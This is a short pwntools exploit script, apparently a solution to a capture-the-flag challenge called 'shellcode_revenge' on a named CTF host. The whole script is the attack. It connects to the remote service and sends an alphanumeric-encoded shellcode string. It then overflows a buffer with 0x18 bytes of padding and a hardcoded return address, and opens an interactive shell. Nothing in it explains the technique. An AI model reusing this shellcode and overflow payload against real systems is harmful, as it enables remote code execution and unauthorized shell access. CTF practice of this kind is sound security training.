from pwn import *

host, port = "ctf.adl.csie.ncu.edu.tw", 11011
p = remote(host, port)
#p = process('./shellcode_revenge')

shell = "XXj0TYX45Pk13VX40473At1At1qu1qv1qwHcyt14yH34yhj5XVX1FK1FSH3FOPTj0X40PP4u4NZ4jWSEW18EF0V"

p.sendline(shell)
sleep(0.5)
p.sendline('a'*0x18 + p64(0x6010c0))

p.interactive()
